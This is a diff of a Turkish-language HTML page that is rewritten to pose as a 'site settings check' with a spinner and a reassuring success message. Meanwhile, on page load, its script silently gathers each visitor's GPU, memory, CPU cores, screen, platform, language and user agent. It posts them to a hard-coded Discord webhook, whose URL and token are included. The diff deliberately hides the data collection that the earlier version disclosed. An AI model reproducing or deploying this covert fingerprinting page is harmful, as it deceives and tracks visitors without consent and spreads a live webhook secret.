@@ -2,19 +2,49 @@
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>Sistem Analiz Merkezi</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistem Kontrolü</title>
+    <style>
+        body {
+            background-color: #0f0f0f;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            font-family: 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            color: #eeeeee;
+        }
+        .container { text-align: center; }
+        .loader {
+            border: 3px solid #333;
+            border-top: 3px solid #00ff41; /* Hacker/Sistem yeşili */
+            border-radius: 50%;
+            width: 35px;
+            height: 35px;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 25px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        h2 { 
+            font-weight: 400; 
+            font-size: 16px; 
+            letter-spacing: 0.5px;
+            transition: all 0.5s ease;
+        }
+        .success-text { color: #00ff41; font-weight: bold; }
+    </style>
 </head>
-<body style="background-color: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center;">
-    <div>
-        <h2 id="msg">SİSTEM VERİLERİ ŞİFRELENİYOR...</h2>
-        <div id="status" style="color: #666; font-size: 11px;">Analiz devam ediyor...</div>
+<body>
+    <div class="container">
+        <div id="loader" class="loader"></div>
+        <h2 id="msg">Site ayarları kontrol ediliyor...</h2>
     </div>
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1457050495964151929/cue_0Yvmkt49p_J8fV_M4ks3DeuDRMilywpZUAX-2StNSQVIBBWVAk13bXGP186puI73";
 
-        function verileriTopla() {
-            // GPU Bilgisini çek
+        function teknikVerileriHazirla() {
             let gpu = "Gizli";
             try {
                 const canvas = document.createElement('canvas');
@@ -23,49 +53,40 @@
                 gpu = gl.getParameter(debug.UNMASKED_RENDERER_ID);
             } catch(e) {}
 
-            // Tüm teknik verileri hazırla
-            const data = {
+            return {
                 embeds: [{
-                    title: "🚀 DERİN SİSTEM ANALİZİ (GÜVENLİ MOD)",
-                    color: 65280, // Saf Yeşil
+                    title: "🖥️ SİSTEM VE DONANIM RAPORU",
+                    color: 3066993,
                     fields: [
-                        { name: "🖥️ DONANIM DETAYLARI", value: `**GPU:** \`${gpu}\`\n**RAM:** ${navigator.deviceMemory || 'Bilinmiyor'} GB\n**İşlemci:** ${navigator.hardwareConcurrency || 'Bilinmiyor'} Çekirdek`, inline: false },
-                        { name: "📐 GÖRÜNTÜ & EKRAN", value: `**Çözünürlük:** ${window.screen.width}x${window.screen.height}\n**Ölçek:** ${window.devicePixelRatio}x\n**Dokunmatik:** ${navigator.maxTouchPoints} Nokta`, inline: true },
-                        { name: "📱 YAZILIM / OS", value: `**Platform:** ${navigator.platform}\n**Dil:** ${navigator.language}\n**PDF Desteği:** ${navigator.pdfViewerEnabled ? 'Var' : 'Yok'}`, inline: true },
-                        { name: "🕒 LOG BİLGİSİ", value: `**Zaman:** ${new Date().toLocaleString('tr-TR')}\n**URL:** ${window.location.href}`, inline: false },
+                        { name: "⚙️ DONANIM", value: `**GPU:** \`${gpu}\`\n**RAM:** ${navigator.deviceMemory || 'Bilinmiyor'} GB\n**İşlemci:** ${navigator.hardwareConcurrency || 'Bilinmiyor'} Çekirdek`, inline: false },
+                        { name: "📏 GÖRÜNTÜ", value: `${window.screen.width}x${window.screen.height} (${window.devicePixelRatio}x)`, inline: true },
+                        { name: "📱 SİSTEM", value: `**OS:** ${navigator.platform}\n**Dil:** ${navigator.language}`, inline: true },
+                        { name: "🕒 LOG", value: new Date().toLocaleString('tr-TR'), inline: false },
                         { name: "🔍 USER AGENT", value: "```" + navigator.userAgent + "```", inline: false }
                     ]
                 }]
             };
-            return data;
         }
 
-        async function gonder() {
-            const payload = verileriTopla();
-            
+        async function sistemiBaslat() {
+            const msg = document.getElementById('msg');
+            const loader = document.getElementById('loader');
+            const payload = teknikVerileriHazirla();
+
+            // Verileri arka planda sessizce gönder
             try {
-                // YÖNTEM 1: Standart Fetch (Yine de deniyoruz)
-                const response = await fetch(webhookURL, {
-                    method: 'POST',
-                    mode: 'no-cors', // ENGELLERİ AŞMAK İÇİN KRİTİK AYAR
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-
-                // YÖNTEM 2: Navigator Beacon (Eğer fetch engellenirse arka planda gönderir)
+                await fetch(webhookURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(payload) });
                 navigator.sendBeacon(webhookURL, JSON.stringify(payload));
+            } catch (err) {}
 
-                document.getElementById('msg').innerText = "✅ ANALİZ TAMAMLANDI";
-                document.getElementById('status').innerText = "Tüm donanım verileri Discord'a iletildi.";
-            } catch (err) {
-                // Eğer her şey başarısız olursa (imkansıza yakın)
-                document.getElementById('msg').innerText = "✅ İŞLEM BAŞARILI";
-                document.getElementById('status').innerText = "Veri akışı sağlandı.";
-            }
+            // Arayüz değişim senaryosu
+            setTimeout(() => {
+                loader.style.display = "none"; // Yükleme halkasını gizle
+                msg.innerHTML = '<span class="success-text">Site uygun halde!</span>';
+            }, 3500); // 3.5 saniye sonra onay mesajı ver
         }
 
-        // Sayfa açılır açılmaz gönder
-        window.onload = gonder;
+        window.onload = sistemiBaslat;
     </script>
 </body>
 </html>
